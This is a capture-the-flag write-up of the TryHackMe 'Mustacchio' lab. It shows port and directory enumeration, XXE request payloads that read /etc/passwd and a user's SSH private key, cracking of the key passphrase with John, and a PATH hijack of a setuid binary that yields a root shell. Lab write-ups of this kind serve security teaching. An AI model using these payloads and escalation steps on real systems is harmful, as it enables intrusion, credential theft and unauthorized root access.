## Mustacchio
https://tryhackme.com/room/mustacchio

## Enum
```
nmap -Pn -sC -sV -A 10.10.103.66 -vv

Scanning ip.thm (10.10.103.66) [1000 ports]
Discovered open port 22/tcp on 10.10.103.66
Discovered open port 80/tcp on 10.10.103.66

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2WTNk2XxeSH8TaknfbKriHmaAOjRnNrbq1/zkFU46DlQRZmmrUP0uXzX6o6mfrAoB5BgoFmQQMackU8IWRHxF9YABxn0vKGhCkTLquVvGtRNJjR8u3BUdJ/wW/HFBIQKfYcM+9agllshikS1j2wn28SeovZJ807kc49MVmCx3m1OyL3sJhouWCy8IKYL38LzOyRd8GEEuj6QiC+y3WCX2Zu7lKxC2AQ7lgHPBtxpAgKY+txdCCEN1bfemgZqQvWBhAQ1qRyZ1H+jr0bs3eCjTuybZTsa8aAJHV9JAWWEYFegsdFPL7n4FRMNz5Qg0BVK2HGIDre343MutQXalAx5P
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCEPDv6sOBVGEIgy/qtZRm+nk+qjGEiWPaK/TF3QBS4iLniYOJpvIGWagvcnvUvODJ0ToNWNb+rfx6FnpNPyOA0=
|   256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGldKE9PtIBaggRavyOW10GTbDFCLUZrB14DN4/2VgyL
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/
|_http-title: Mustacchio | Home
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
 ffuf -u http://ip.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```
```
________________________________________________

.htpasswd               [Status: 403, Size: 271, Words: 20, Lines: 10, Duration: 325ms]
.hta                    [Status: 403, Size: 271, Words: 20, Lines: 10, Duration: 5197ms]
.htaccess               [Status: 403, Size: 271, Words: 20, Lines: 10, Duration: 5185ms]
custom                  [Status: 301, Size: 301, Words: 20, Lines: 10, Duration: 321ms]
fonts                   [Status: 301, Size: 300, Words: 20, Lines: 10, Duration: 334ms]
images                  [Status: 301, Size: 301, Words: 20, Lines: 10, Duration: 316ms]
index.html              [Status: 200, Size: 1752, Words: 77, Lines: 73, Duration: 329ms]
robots.txt              [Status: 200, Size: 28, Words: 3, Lines: 3, Duration: 325ms]
server-status           [Status: 403, Size: 271, Words: 20, Lines: 10, Duration: 352ms]
:: Progress: [4713/4713] :: Job [1/1] :: 125 req/sec :: Duration: [0:00:42] :: Errors: 0 ::
```

![image](https://user-images.githubusercontent.com/6504854/187075260-131c41fe-64ca-4099-b192-270e787e71f2.png)

```
 file /root/Downloads/users.bak
/root/Downloads/users.bak: SQLite 3.x database, last written using SQLite version 3034001, file counter 2, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 2
```

![image](https://user-images.githubusercontent.com/6504854/187086195-587d5a5c-c6ff-41a1-8489-d31eaf16cbff.png)

![image](https://user-images.githubusercontent.com/6504854/187086151-26d65ac8-3a54-4b57-8fdc-fe2424b975f4.png)

🏴 I got admin's credential but no login form. May be it's another port?

```
nmap -Pn 10.10.103.66 -vv -p- --min-rate 1000

Scanning ip.thm (10.10.103.66) [65535 ports]
Discovered open port 22/tcp on 10.10.103.66
Discovered open port 80/tcp on 10.10.103.66
Discovered open port 8765/tcp on 10.10.103.66
Not shown: 65532 filtered tcp ports (no-response)

PORT     STATE SERVICE        REASON
22/tcp   open  ssh            syn-ack ttl 63
80/tcp   open  http           syn-ack ttl 63
8765/tcp open  ultraseek-http syn-ack ttl 63
```
🏴 I scanned with min-rate 5000 and Nmap droped all ports. 😢

![image](https://user-images.githubusercontent.com/6504854/187078049-c0fd24c9-6dda-4ca2-8306-7ca1001352ac.png)

![image](https://user-images.githubusercontent.com/6504854/187086425-de02866e-c1ed-44ef-ad57-2cee27baa7eb.png)

![image](https://user-images.githubusercontent.com/6504854/187086577-4c8242cd-5721-4867-8a3a-2df653faaf86.png)

```
wget ip.thm:8765/auth/dontforget.bak

Saving to: ‘dontforget.bak’
```

```
cat dontforget.bak

<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
```
![image](https://user-images.githubusercontent.com/6504854/187086739-dc30d0be-0544-4ce7-8c48-5fe5e91a606c.png)

![image](https://user-images.githubusercontent.com/6504854/187086785-6a3d01e9-b5f8-4784-a30b-2e8c8a111c20.png)

```
POST /home.php HTTP/1.1
Host: ip.thm:8765
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=gcthsudm9vk5aekeugannr9ot7
Content-Length: 212

xml=<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f>
<!DOCTYPE root [<!ENTITY example SYSTEM 'file:///etc/passwd'>]>
<comment>
  <name>test</name>
  <author>test</author>
  <com>%26example%3b</com>
</comment>
```
🏴 %26 %3b

![image](https://user-images.githubusercontent.com/6504854/187087123-c9e582db-930a-47c6-a761-3d0b6785ea82.png)

```
POST /home.php HTTP/1.1
Host: ip.thm:8765
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=gcthsudm9vk5aekeugannr9ot7
Content-Length: 216

xml=<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY example SYSTEM 'file:///home/barry/.ssh/id_rsa'>]>
<comment>
  <name>test</name>
  <author>test</author>
  <com>%26example%3b</com>
</comment>
```

```
chmod 600 barry_rsa

ssh barry@ip.thm -i barry_rsa
Enter passphrase for key 'barry_rsa':
barry@ip.thm: Permission denied (publickey).
```
😢

```
ssh2john barry_rsa > hash

john hash --wordlist=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])

u********       (barry_rsa)

Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
john氏～😘😘😘　やっとこさ。

## Flag
```
ssh barry@ip.thm -i barry_rsa
Enter passphrase for key 'barry_rsa':
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

barry@mustacchio:~$cat user.txt
```

```
find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null

-rwsr-xr-x 1 root root 84120 Apr  9  2019 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 14864 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 110792 Feb  8  2021 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 428240 May 26  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 54256 Mar 26  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 23376 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 71824 Mar 26  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 39904 Mar 26  2019 /usr/bin/newgrp
-rwsr-sr-x 1 daemon daemon 51464 Jan 14  2016 /usr/bin/at
-rwsr-xr-x 1 root root 40432 Mar 26  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 32944 Mar 26  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 136808 Jan 20  2021 /usr/bin/sudo
-rwsr-xr-x 1 root root 32944 Mar 26  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 75304 Mar 26  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 16832 Jun 12  2021 /home/joe/live_log
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 27608 Jan 27  2020 /bin/umount
-rwsr-xr-x 1 root root 40152 Jan 27  2020 /bin/mount
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 40128 Mar 26  2019 /bin/su
```

```
file /home/joe/live*

/home/joe/live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a45518964ad12abe, for GNU/Linux 3.2.0, not stripped
```

```
barry@mustacchio:~$ /home/joe/live_log

10.4.63.222 - - [28/Aug/2022:17:31:11 +0000] "POST /home.php HTTP/1.1" 200 2080 "-" "-"
10.4.63.222 - - [28/Aug/2022:17:31:29 +0000] "POST /home.php HTTP/1.1" 200 3853 "-" "-"
10.4.63.222 - - [28/Aug/2022:17:32:24 +0000] "POST /home.php HTTP/1.1" 200 3853 "-" "-"
^CLive Nginx Log Readerbarry
```

```
@mustacchio:~$ strings /home/joe/live_log

/lib64/ld-linux-x86-64.so.2
libc.so.6
........
Live Nginx Log Reader
tail -f /var/log/nginx/access.log
:*3$"
GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
........
```

```
barry@mustacchio:~$ echo '/bin/bash' > tail
barry@mustacchio:~$ chmod +x tail
barry@mustacchio:~$ export PATH=/home/barry:$PATH
barry@mustacchio:~$ /home/joe/live_log

root@mustacchio:~# cat /root/root.txt
```

Thank you for your time! Happy Hacking 😄 😪 🛌

wget できなくて、そうい堅牢化のやりかたもあるかと思った。Polkitできなかった。ねるか。

